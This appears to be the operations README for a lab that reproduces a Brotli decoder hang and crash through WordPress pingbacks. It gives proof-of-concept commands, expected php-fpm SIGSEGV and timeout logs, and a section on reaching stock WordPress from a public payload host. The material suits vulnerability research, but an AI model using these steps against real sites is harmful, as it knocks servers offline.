# Lab setup and operations

## Services

| Service | Image | Role | Host port |
|---|---|---|---|
| `db` | `mariadb:11.4` | WordPress database | — |
| `wordpress` | official `wordpress:php8.3-fpm` (digest pinned) | PHP-FPM + vulnerable `libbrotlidec` | — |
| `nginx` | `nginx:1.27-alpine` | HTTP front end | `8080` |
| `attacker` | built from `lab/attacker` | payload generator + HTTP server | `8081` |
| `wp-init` | `wordpress:cli` | one-shot WordPress installer | — |

The default Compose project name is `brotli-pingback-lab`.

```text
WordPress  http://localhost:8080
xmlrpc     http://localhost:8080/xmlrpc.php
payload    http://localhost:8081/health
admin      http://localhost:8080/wp-admin/  (admin / admin)
```

The admin credentials are lab-only. Do not expose this stack.

---

## First start

```bash
cp .env.example .env
make up
```

`make up` does two things:

1. `docker compose up -d --build` starts db, wordpress, nginx, attacker.
2. `docker compose run --rm wp-init` installs WordPress and creates the
   default Hello World post if the database is empty.

The installer is idempotent; running `make init` again is safe.

Check the result:

```bash
make probe
```

Expected:

```text
[*] target      : http://localhost:8080
[*] GET /       : HTTP 200 in 0.0s
[*] title       : Brotli Pingback Lab
[*] xmlrpc.php  : HTTP 200 in 0.0s
[+] pingback.ping is exposed
```

`GET /xmlrpc.php` returns 405 with “XML-RPC server accepts POST requests
only.” That is normal; `make probe` uses a POST.

---

## Verify the vulnerable stack

```bash
make verify
```

It prints the PHP/curl/Brotli versions and then performs a behavioural test:
fetch `http://attacker:8080/small.br` with `CURLOPT_ENCODING=''` and a 6s
external timeout.

```text
[*] PHP / libcurl / Brotli versions
php=8.3.x curl=8.x brotli=1.1.0 brotli_feature=yes

[*] libbrotli package
Version: 1.1.0-2+b7

[*] behavioural test ...
[+] VULNERABLE: the decoder loop did not return within 6s
```

If it returns quickly, the image was updated or the payload was not decoded.
Check that `libbrotli1` is older than 1.0.10 / 1.1.1 / 1.2.1 and that
`curl_version()['features']` has `CURL_VERSION_BROTLI`.

---

## Run the PoC

### Probe only

```bash
make probe
# or
python3 poc/pingback_poc.py --target http://localhost:8080 --mode probe
```

### 86-byte hang

```bash
make hang
# or
python3 poc/pingback_poc.py \
  --target http://localhost:8080 \
  --mode hang \
  --payload-url http://attacker:8080/small.br \
  --workers 4 --count 4 --show-logs
```

The PoC sends four concurrent pingbacks. All four workers spin. php-fpm
kills them after `request_terminate_timeout = 15s`. The site is unavailable
while the pool is occupied.

Look for:

```text
WARNING: [pool www] child 43 execution timed out (15.0 sec), terminating
WARNING: [pool www] child 43 exited on signal 15 (SIGTERM) after 15.1 seconds from start
```

### 23 MB crash

```bash
make crash
# or
python3 poc/pingback_poc.py \
  --target http://localhost:8080 \
  --mode crash \
  --payload-url http://attacker:8080/payload.br \
  --workers 4 --count 4 --show-logs
```

Each pingback makes the worker decode the 23 MB stream and die with
`SIGSEGV`. Look for:

```text
WARNING: [pool www] child 42 exited on signal 11 (SIGSEGV) after 1.2 seconds from start
```

`make crash` sends four by default because each crash only removes one of
the four workers; the site stays up between respawns. One crash is enough to
prove the bug.

### One request at a time

```bash
python3 poc/pingback_poc.py \
  --target http://localhost:8080 \
  --mode crash \
  --payload-url http://attacker:8080/payload.br \
  --workers 1 --count 1 --timeout 30 --show-logs
```

Use this when you want a clean single `SIGSEGV` line in the log.

---

## Inspecting the worker pool

```bash
docker compose logs -f wordpress
docker compose exec wordpress ps aux | grep php-fpm
docker compose exec wordpress sh -c 'ss -ltnp | grep 9000'
```

`php-fpm` runs as PID 1 in the container. The master logs child exits to
stdout because `catch_workers_output = yes` is set in
`lab/php-fpm/zz-lab.conf`.

To watch CPU during a hang:

```bash
docker stats $(docker compose ps -q wordpress)
```

A single hung worker sits near 100% of one core.

---

## Changing the lab

### More workers

Edit `lab/php-fpm/zz-lab.conf`:

```ini
pm.max_children = 8
request_terminate_timeout = 30s
```

Then `docker compose up -d --force-recreate wordpress`.

### Different WordPress version

The compose file pins:

```yaml
image: wordpress:php8.3-fpm@sha256:96b154...
```

Pinning the digest is deliberate: a future `wordpress:php8.3-fpm` rebuild
may ship a patched `libbrotli1`, and the lab would silently stop working.
If you change the tag, run `make verify` afterwards.

### Stock WordPress (no mu-plugin)

Remove this volume from `docker-compose.yml`:

```yaml
- ./lab/wordpress/mu-plugins:/var/www/html/wp-content/mu-plugins:ro
```

Then serve the payload from a public host that **preserves the raw bytes**
(for example a VPS with a public IP) so `wp_safe_remote_get()` accepts the
source. An HTTP proxy or CDN that decodes `Content-Encoding: br` will
neutralize the payload.

### Different payload delay

```bash
CHUNK_DELAY=2.0 docker compose up -d --force-recreate attacker
```

A longer delay gives a slow client more time to drain the 23 MB before the
tail, but it counts against WordPress's 10-second HTTP timeout.

---

## Troubleshooting

### `make up` fails in `wp-init`

```bash
docker compose logs db
docker compose logs wordpress
docker compose run --rm wp-init
```

Common causes:

* MariaDB is still initializing — wait for the healthcheck and retry.
* The `wp_data` volume contains a half-installed site — `make reset` and
  start again.
* Permissions on a bind-mounted `wp-content` directory — the official image
  runs as `www-data` (uid 33).

### `make probe` says pingback is not exposed

* A security plugin disabled XML-RPC. The lab image has no plugins; check
  `docker compose exec wordpress ls wp-content/plugins`.
* `xmlrpc.php` is blocked by nginx or a WAF. Check
  `docker compose logs nginx`.
* `WP_HTTP_BLOCK_EXTERNAL` or a custom filter blocks outbound requests.

### `make hang` returns an XML-RPC fault instead of hanging

The payload was fetched but the decoder did not spin. Possible reasons:

* the image is patched — run `make verify`;
* the payload URL is wrong — `curl -v http://localhost:8081/small.br`
  should show `Content-Encoding: br` and 86 bytes;
* WordPress did not send `Accept-Encoding: br` — the Requests transport may
  be using the `Fsockopen` fallback instead of cURL. Check
  `php -m | grep curl` and `curl_version()`.

### `make crash` returns “The source URL does not exist”

WordPress could not fetch the payload. Check, in order:

1. `curl -v http://localhost:8081/health` from the host;
2. `docker compose exec wordpress php -r 'var_dump(@file_get_contents("http://attacker:8080/health"));'`;
3. the mu-plugin is mounted:
   `docker compose exec wordpress ls -l wp-content/mu-plugins`;
4. the source URL is public and byte-preserving (a decoding CDN will not
   work), or the host is `attacker` (local mode);
5. the 23 MB transfer did not exceed the 10-second timeout.

### `make crash` returns a fault, no SIGSEGV

The worker survived. Run `make verify`; if the decoder is patched, the 23 MB
stream is rejected as a format error and Requests retries without decoding.
Switch to the pinned image digest or rebuild the lab on a vulnerable base.

### No `SIGSEGV` in the logs

* php-fpm may not log child exits at your log level; check
  `docker compose logs wordpress` without filters.
* The worker may have been killed by `request_terminate_timeout` before the
  tail arrived. Increase it temporarily and retry.
* The payload may have been served without the chunk boundary. Check the
  attacker logs and the `CHUNK_DELAY` value.

### Ports 8080/8081 are already in use

```bash
cat > .env <<'EOF'
WP_PORT=8090
ATTACKER_PORT=8091
CHUNK_DELAY=1.0
EOF
make up
```

The Makefile includes `.env`, so `make probe` follows the new port.

### Apple Silicon / arm64

The crash tail depends on the x86-64 `BrotliDecoderState` layout. Use an
x86-64 host, or force emulation:

```bash
DOCKER_DEFAULT_PLATFORM=linux/amd64 make up
```

Emulation is slower and the 23 MB payload may exceed the pingback timeout.
The 86-byte hang does not depend on struct offsets and works either way.

### Resetting

```bash
make down      # stop, keep volumes
make reset     # stop and delete db_data + wp_data
make clean     # remove generated payloads and __pycache__
```

---

## Resource use

* Images: ~1.2 GB (WordPress FPM is the largest).
* Runtime: ~250 MB RAM for db + wordpress + nginx + attacker.
* The attacker holds the 23 MB payload in memory and writes it to
  `/payloads` inside the container.

The lab does not need Internet access at runtime. Internet is only needed
to pull the Docker images.
